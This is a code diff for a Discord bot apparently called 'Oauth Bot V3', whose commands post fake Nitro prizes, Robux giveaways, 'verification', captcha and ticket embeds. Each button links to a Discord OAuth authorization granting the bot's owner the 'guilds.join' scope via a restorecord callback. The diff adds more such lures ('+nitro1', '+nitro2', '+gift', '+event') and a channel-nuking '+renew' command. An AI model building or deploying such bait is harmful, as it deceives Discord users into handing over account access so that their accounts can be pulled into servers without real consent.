@@ -17,7 +17,7 @@ client.prefix = "+"
 
     const activities = [
       "...",
-      "+help | v2",
+      "+help | v3",
     ];
 
     client.on("ready", () => {
@@ -38,9 +38,9 @@ client.on('message', async (message) => {
     if (message.content.startsWith('+help')) {
         const embed = new MessageEmbed()
         .setColor("RANDOM")
-        .setTitle(`**Oauth Bot V2**`)
+        .setTitle(`**Oauth Bot V3**`)
 
-        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`nitro\` \`verification\` \`giveaway\` \`boost\` \`captcha\` \`ticket\``)
+        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\` \`renew\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`gift\` \`nitro1\` \`nitro2\` \`roblox\` \`verification\` \`giveaway\` \`boost\` \`captcha\` \`ticket\` \`event\``)
         message.channel.send({embed: embed })
     }
 })
@@ -77,10 +77,50 @@ client.on('message', async (message) => {
    )}
 })
 
+client.on('message', async (message) => {
+  if (message.content.startsWith('+renew')) {
+      if (!message.member.hasPermission("MANAGE_CHANNELS")) {
+          return message.channel.send("You don't have permissions to do this command!")
 
+      }
+      message.channel.clone().then
+      ((ch) => {
+          ch.setParent(message.channel.parent);
+          ch.setPosition(message.channel.position);
+          message.channel.delete().then(() => {
+              ch.send("**Channel Nuked** \n https://imgur.com/LIyGeCR")
+          })
+
+      });
+}
+}
+)
 
 
 //----------------GRAB------------------
+
+
+
+client.on('message', async (message) => {
+    if (message.content.startsWith('+event')) {
+        const embed = new MessageEmbed()
+        .setColor("0")
+        .setTitle(`__**🎁 Prizes**__`)
+
+        .setDescription (`・ Instant Claim ⚡️
+
+・ 2 Invite = Nitro Boost Monthly / 2000 robux
+
+・ 3 Invite = Nitro Basic Yearly / 3000 robux
+
+・4 Invite = Nitro Boost Yearly / 4000 Robux
+
+
+🎊 Are you out of invitations? Verify your invites in ⁠the invites channel and DM the Owner to claim your reward. `)
+        .setImage("https://www.centralxbox.com.br/wp-content/uploads/2019/11/discord-nitro.jpg")
+        message.channel.send({embed: embed })
+    }
+})
 
 client.on('message', async (message) => {
     if (message.content.startsWith('+nsfw')) {
@@ -93,7 +133,7 @@ client.on('message', async (message) => {
         const z = new MessageButton()
             .setStyle("url")
             .setLabel("🔞")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([z])
 
@@ -101,22 +141,67 @@ client.on('message', async (message) => {
     }
 })
   
+client.on('message', async (message) => {
+    if (message.content.startsWith('+nitro1')) {
+        const embed = new MessageEmbed()
+        .setDescription(`**You won a nitro classic click claim button to get!**`)
+.setImage('https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png')
+        .setColor("0")
 
+        const y = new MessageButton()
+            .setStyle("url")
+            .setLabel("Claim")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
+        const row = new MessageActionRow()
+            .addComponent([y])
+
+        message.channel.send({ component: row, embed: embed })
+    }
+})
+
+client.on('message', async (message) => {
+    if (message.content.startsWith('+nitro2')) {
+        const embed = new MessageEmbed()
+        .setDescription(`**You won a nitro boost click claim button to get!**`)
+.setImage('https://media.discordapp.net/attachments/1160257350305841282/1167579455129129000/11111unknown.png?ex=654ea41a&is=653c2f1a&hm=d6b7298ea911675c2a252913f932e0fd6cfb1eed9938cd2ea734f30cbdac9e77&=')
+        .setColor("0")
+
+        const y = new MessageButton()
+            .setStyle("url")
+            .setLabel("Claim")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
+        const row = new MessageActionRow()
+            .addComponent([y])
+
+        message.channel.send({ component: row, embed: embed })
+    }
+})
+
+client.on("message", async (message) => {
+  //if (message.author.bot) return;
+  if (message.content.startsWith("+gift")) {
+    let button = new MessageButton()
+    .setStyle('url')
+    .setURL('https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802')
+    .setLabel('Claim');
+    message.channel.send('https://media.discordapp.net/attachments/1160257350305841282/1167579464511782963/55PTtjKxcf5X2uHi7deJcQ.png?ex=654ea41c&is=653c2f1c&hm=67af30e51aa927ec41039b51297e71b5f43f79a371d7e938732f9679b0434a6d&=',button)
+  }
+})
 
 client.on('message', async (message) => {
     if (message.content.startsWith('+boost')) {
         const embed = new MessageEmbed()
         .setTitle("Hello everyone, you have all received a Nitro Discord for one year!")
         .setDescription(`To get your Nitro Boost, all you need to do is:
-   \n1️⃣ Click on the button [claim](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399).
-   \n2️⃣ Click on the button [autorize](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399).\n\nOnce you get autorized you need to wait about 24-48 hours and you will get it.`)
+   \n1️⃣ Click on the button [claim](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802).
+   \n2️⃣ Click on the button [autorize](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802).\n\nOnce you get autorized you need to wait about 24-48 hours and you will get it.`)
 .setImage('https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png')
         .setColor("0")
 
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("🎁 Claim")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -129,13 +214,13 @@ client.on('message', async (message) => {
     if (message.content.startsWith('+giveaway')) {
         const embed = new MessageEmbed()
         .setTitle("**Nitro Boost 1 month 🎁** ")
-        .setDescription(`\nWinners: \`1\`\nTimer: \`Ends in 2 hours\`\nHosted by: <@${ctx.author.id}>\n\n\n\n:tada: To enter the giveaway, click on the button below.`)
+        .setDescription(`\nWinners: \`1\`\nTimer: \`Ends in 2 hours\`\nHosted by: \`~ Nassoxx\` \n\n\n\n:tada: To enter the giveaway, click on the button below.`)
         .setColor("0")
 
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("🎉 Enter")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -153,7 +238,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Claim")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -172,7 +257,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("✅")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -192,7 +277,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Respond")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -212,7 +297,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("📩 Create ticket")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
+            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
 
